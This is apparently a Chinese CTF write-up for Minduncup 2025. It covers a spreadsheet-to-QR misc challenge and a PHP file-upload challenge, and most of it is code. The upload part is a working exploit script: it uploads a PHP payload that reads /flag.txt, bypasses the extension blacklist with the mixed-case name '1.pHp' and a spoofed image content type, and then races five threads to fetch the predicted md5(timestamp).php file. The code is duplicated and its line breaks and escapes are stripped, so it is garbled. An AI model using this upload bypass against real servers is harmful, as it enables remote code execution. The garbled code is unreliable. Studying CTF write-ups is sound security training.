---
title: 闽盾杯2025部分题解
contest: 闽盾杯
year: 2025
difficulty: medium
vuln_type: file_upload
tags:
- Misc-xlsx2png
- Excel解析+PIL
- Web-upload.php
- 1.pHp大小写绕
- MD5爆破+时间窗口
- 条件竞争+多线程
attack_chain: 'QR_Maze.xlsx: zipfile打开xlsx+ET解析xl/worksheets/sheet+sharedStrings+>0.5判断1/0+PIL画图+resize 6倍|upload.php: 1.pHp大小写+content-type image/png+<?=print_r(file(''/flag.txt''));?>|md5(timestamp).php文件名爆破:datetime.utcnow()±2秒 strftime(''%Y%m%d%H%M%S'') md5|条件竞争: 5个读取线程+0.05s延时上传+stop_event'
key_payload: 'zipfile.ZipFile + ET.fromstring + a1rc r''(\w+)(\d+)'' + float(v.text)>0.5 ? 1 : 0 + PIL L 255/0 + resize 6x|filename=''1.pHp'' content=''<?= print_r(file("/flag.txt"));?>''|datetime.utcnow()+timedelta(seconds=offset) timestamp.strftime(''%Y%m%d%H%M%S'') md5 .php|threads 5 + time.sleep(0.05) + upload + stop_event.set()'
one_liner: 闽盾杯2025:QR_Maze.xlsx(Excel+PIL 6倍画二维码)+upload.php(1.pHp大小写+content-type image/png+<?=file()读flag)+MD5时间窗口爆破文件名(±2秒)+5线程条件竞争读
lesson: 1) xlsx=zip+xml:zipfile+ET解析worksheet+sharedStrings+>0.5判断01; 2) PIL.resize 6倍放大:Image.NEAREST邻插值; 3) upload.php .pHp大小写绕(content-type image/png+扩展名大小写绕后缀检查); 4) MD5(timestamp).php文件名爆破:时间窗口±2秒+5线程竞争; 5) condition race:多线程同时读+stop_event抢锁
quality: high
full_path: 闽盾杯2025部分题解.full.md
meta_path: 闽盾杯2025部分题解.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 闽盾杯2025部分题解。闽盾杯2025:QR_Maze.xlsx(Excel+PIL 6倍画二维码)+upload.php(1.pHp大小写+content-type image/png+<?=file()读flag)+MD5时间窗口爆破文件名(±2秒)+5线程条件竞争读。经验：1) xlsx=zip+xml:zipfile+ET解析worksheet+sharedStrings+>0.5判...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/269428.html
reasoning_chain:
- QR_Maze.xlsx → 触发点：Excel 文件隐二维码
- 假设：xlsx=zip+xml → 动作：zipfile.ZipFile + ET.fromstring 解析 worksheet
- '假设：>0.5 判 1/0 → 动作：float(v.text)>0.5 ? 1 : 0 → PIL Image.new L'
- 观察：Image.NEAREST resize 6 倍 → 还原 QR 扫码
- upload.php 1.jpg 试验 → 假设：扩展名黑名单
- 动作：filename='1.pHp' content='<?= print_r(file("/flag.txt"));?>'
- 观察：上传成功（1.pHp 大小写绕 content-type image/png）
- 假设：上传后被改名 md5(timestamp).php → 动作：datetime.utcnow() ±2s 爆破文件名
- 动作：5 线程 try_read_multiple + stop_event + 0.05s 后上传 → 条件竞争读
- 观察：成功读到 flag
failed_attempts:
- 试图用 1.php 上传 → 失败：后缀黑名单拦
- 试图单线程读 → 失败：上传与读之间时序错位
key_observations:
- xlsx=zip+xml 解析 + 数值判 01 + PIL 画图 = 二维码生成套路
- 1.pHp 大小写绕扩展名黑名单是 PHP 上传经典
- MD5(timestamp).php 文件名爆破 + 条件竞争读 = 抢拍 trick
- stop_event + 多线程并发读 + 0.05s 延时上传是竞争标配
prerequisites:
- Python zipfile + xml.etree.ElementTree 解析 xlsx
- PIL Image.new + resize NEAREST
- requests multipart 上传 + 大小写绕
- threading.Event + 时间窗口爆破
---
# 闽盾杯2025部分题解

> 原文: https://www.ctfiot.com/269428.html
> ID: 269428

import zipfile, xml.etree.ElementTree as ET, refrom PIL import Image
f = "QR_Maze.xlsx"
def a1rc(a1):    m = re.match(r"([A-Z]+)(d+)", a1)    col = 0    for ch in m.group(1):        col = col*26+(ord(ch)-64)    return int(m.group(2)), col
def load(f):    with zipfile.ZipFile(f,'r') as z:        ws = [n for n in z.namelist() if n.startswith("xl/worksheets/sheet")]        ws.sort()        xml = z.read(ws[0])        ss = []        if "xl/sharedStrings.xml" in z.namelist():            root = ET.fromstring(z.read("xl/sharedStrings.xml"))            for si in root.findall(".//{http://schemas.openxmlformats.org/spreadsheetml/2006/main}si"):                ss.append("".join([t.text or "" for t in si.findall(".//{http://schemas.openxmlformats.org/spreadsheetml/2006/main}t")]))    ns = {"a":"http://schemas.openxmlformats.org/spreadsheetml/2006/main"}    root = ET.fromstring(xml)    cels = {}; mr = mc = 0    for c in root.findall(".//a:c",ns):        r = c.attrib.get("r"); t = c.attrib.get("t")        rr,cc = a1rc(r)        v = c.find("a:v",ns)        val = 0        if v is not None and v.text:            if t=="s":                s = ss[int(v.text)].strip()                val = 1 if s not in ("","0") else 0            else:                try: val = 1 if float(v.text.strip())>0.5 else 0                
except: val = 0        cels[(rr,cc)] = val; mr=max(mr,rr); mc=max(mc,cc)    g = [[0]*mc for _ in range(mr)]    for (rr,cc),v in cels.items(): g[rr-1][cc-1]=v    return g
g = load(f)h,w=len(g),len(g[0])img = Image.new("L",(w,h))px=img.load()for y in range(h):    for x in range(w):        px[x,y]=255 if g[y][x]==1 else 0img=img.resize((w*6,h*6),Image.NEAREST)img.save("1.png")

import requestsimport timeimport threadingimport hashlibfrom datetime import datetime, timedelta
def upload_file(filename):    burp0_url = "http://119.233.150.160:
22148/upload.php"    payload = "<?= print_r(file('/flag.txt'));"    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
142.0) Gecko/20100101 Firefox/142.0", "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://119.233.150.160:
22148/", "Content-Type": "multipart/form-data; boundary=----geckoformboundary8e4a4d3f9e03f70ca220b92e5ada3e7c", "Origin": "http://119.233.150.160:
22148", "Priority": "u=0"}    burp0_data = f"------geckoformboundary8e4a4d3f9e03f70ca220b92e5ada3e7crnContent-Disposition: form-data; name="file"; filename="{filename}"rnContent-Type: image/pngrnrn{payload}rn------geckoformboundary8e4a4d3f9e03f70ca220b92e5ada3e7c--rn"    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)    print(f"Request URL: {burp0_url}")    print(f"Response: {response.status_code} {response.text}")    return response
def read_file(file_path):    read_url = f"http://119.233.150.160:
22148/uploads/{file_path}"    try:        response = requests.get(read_url)        print(f"Request URL: {read_url}n")        print(f"{response.status_code} {response.text}")        return response.status_code == 200    
except Exception as e:        print(f"nRequest URL: {read_url}")        print(f"Error: {e}")        return False
def exploit():    legal_filename = "1.jpg"    initial_response = upload_file(legal_filename)        filename = "1.pHp"        def generate_possible_filenames():        possible_filenames = []        base_time = datetime.utcnow()        time_offsets = [0, -1, 1, -2, 2]        for offset in time_offsets:            target_time = base_time + timedelta(seconds=offset)            timestamp = target_time.strftime("%Y%m%d%H%M%S")            md5_hash = hashlib.md5(timestamp.encode()).hexdigest()            predicted_name = f"{md5_hash}.php"            possible_filenames.append(predicted_name)        return possible_filenames        def try_read_multiple(filenames, stop_event):        max_attempts = 50  # 增加尝试次数        attempt = 0                while attempt < max_attempts and not stop_event.is_set():            for filename in filenames:                if stop_event.is_set():                    return False                                if read_file(filename):                    stop_event.set()                    return True            time.sleep(0.01)  # 减少等待时间，提高频率            attempt += 1                return False        possible_filenames = generate_possible_filenames()    stop_event = threading.Event()        # 提前启动多个读取线程，增加竞争成功的概率    threads = []    for i in range(5):  # 启动5个线程        thread = threading.Thread(target=try_read_multiple, args=(possible_filenames, stop_event))        thread.start()        threads.append(thread)        # 短暂等待后开始上传    time.sleep(0.05)    upload_response = upload_file(filename)        # 在收到上传响应后立即停止所有读取线程    stop_event.set()        # 等待所有读取线程完成    for thread in threads:        thread.join()
if __name__ == "__main__":    exploit()


```
import zipfile, xml.etree.ElementTree as ET, refrom PIL import Image
f = "QR_Maze.xlsx"
def a1rc(a1):    m = re.match(r"([A-Z]+)(d+)", a1)    col = 0    for ch in m.group(1):        col = col*26+(ord(ch)-64)    return int(m.group(2)), col
def load(f):    with zipfile.ZipFile(f,'r') as z:        ws = [n for n in z.namelist() if n.startswith("xl/worksheets/sheet")]        ws.sort()        xml = z.read(ws[0])        ss = []        if "xl/sharedStrings.xml" in z.namelist():            root = ET.fromstring(z.read("xl/sharedStrings.xml"))            for si in root.findall(".//{http://schemas.openxmlformats.org/spreadsheetml/2006/main}si"):                ss.append("".join([t.text or "" for t in si.findall(".//{http://schemas.openxmlformats.org/spreadsheetml/2006/main}t")]))    ns = {"a":"http://schemas.openxmlformats.org/spreadsheetml/2006/main"}    root = ET.fromstring(xml)    cels = {}; mr = mc = 0    for c in root.findall(".//a:c",ns):        r = c.attrib.get("r"); t = c.attrib.get("t")        rr,cc = a1rc(r)        v = c.find("a:v",ns)        val = 0        if v is not None and v.text:            if t=="s":                s = ss[int(v.text)].strip()                val = 1 if s not in ("","0") else 0            else:                try: val = 1 if float(v.text.strip())>0.5 else 0                
except: val = 0        cels[(rr,cc)] = val; mr=max(mr,rr); mc=max(mc,cc)    g = [[0]*mc for _ in range(mr)]    for (rr,cc),v in cels.items(): g[rr-1][cc-1]=v    return g
g = load(f)h,w=len(g),len(g[0])img = Image.new("L",(w,h))px=img.load()for y in range(h):    for x in range(w):        px[x,y]=255 if g[y][x]==1 else 0img=img.resize((w*6,h*6),Image.NEAREST)img.save("1.png")
import requestsimport timeimport threadingimport hashlibfrom datetime import datetime, timedelta
def upload_file(filename):    burp0_url = "http://119.233.150.160:
22148/upload.php"    payload = "<?= print_r(file('/flag.txt'));"    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
142.0) Gecko/20100101 Firefox/142.0", "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://119.233.150.160:
22148/", "Content-Type": "multipart/form-data; boundary=----geckoformboundary8e4a4d3f9e03f70ca220b92e5ada3e7c", "Origin": "http://119.233.150.160:
22148", "Priority": "u=0"}    burp0_data = f"------geckoformboundary8e4a4d3f9e03f70ca220b92e5ada3e7crnContent-Disposition: form-data; name="file"; filename="{filename}"rnContent-Type: image/pngrnrn{payload}rn------geckoformboundary8e4a4d3f9e03f70ca220b92e5ada3e7c--rn"    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)    print(f"Request URL: {burp0_url}")    print(f"Response: {response.status_code} {response.text}")    return response
def read_file(file_path):    read_url = f"http://119.233.150.160:
22148/uploads/{file_path}"    try:        response = requests.get(read_url)        print(f"Request URL: {read_url}n")        print(f"{response.status_code} {response.text}")        return response.status_code == 200    
except Exception as e:        print(f"nRequest URL: {read_url}")        print(f"Error: {e}")        return False
def exploit():    legal_filename = "1.jpg"    initial_response = upload_file(legal_filename)        filename = "1.pHp"        def generate_possible_filenames():        possible_filenames = []        base_time = datetime.utcnow()        time_offsets = [0, -1, 1, -2, 2]        for offset in time_offsets:            target_time = base_time + timedelta(seconds=offset)            timestamp = target_time.strftime("%Y%m%d%H%M%S")            md5_hash = hashlib.md5(timestamp.encode()).hexdigest()            predicted_name = f"{md5_hash}.php"            possible_filenames.append(predicted_name)        return possible_filenames        def try_read_multiple(filenames, stop_event):        max_attempts = 50  # 增加尝试次数        attempt = 0                while attempt < max_attempts and not stop_event.is_set():            for filename in filenames:                if stop_event.is_set():                    return False                                if read_file(filename):                    stop_event.set()                    return True            time.sleep(0.01)  # 减少等待时间，提高频率            attempt += 1                return False        possible_filenames = generate_possible_filenames()    stop_event = threading.Event()        # 提前启动多个读取线程，增加竞争成功的概率    threads = []    for i in range(5):  # 启动5个线程        thread = threading.Thread(target=try_read_multiple, args=(possible_filenames, stop_event))        thread.start()        threads.append(thread)        # 短暂等待后开始上传    time.sleep(0.05)    upload_response = upload_file(filename)        # 在收到上传响应后立即停止所有读取线程    stop_event.set()        # 等待所有读取线程完成    for thread in threads:        thread.join()
if __name__ == "__main__":    exploit()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]